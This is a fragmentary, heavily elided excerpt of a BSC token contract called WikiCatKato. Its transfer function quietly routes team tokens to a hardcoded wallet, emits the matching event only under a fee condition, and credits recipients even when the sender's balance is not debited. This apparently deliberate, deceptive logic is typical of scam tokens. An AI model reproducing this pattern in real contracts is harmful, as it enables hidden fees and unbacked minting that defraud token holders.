...
// Submitted for Telegram: https://t.me/wikicatkato_bsc
...
contract  WikiCatKato  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x3b21e39502298F8cCaff58Fd5CaA688eb203E1d8] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x3b21e39502298F8cCaff58Fd5CaA688eb203E1d8, _teamtoken);
        }
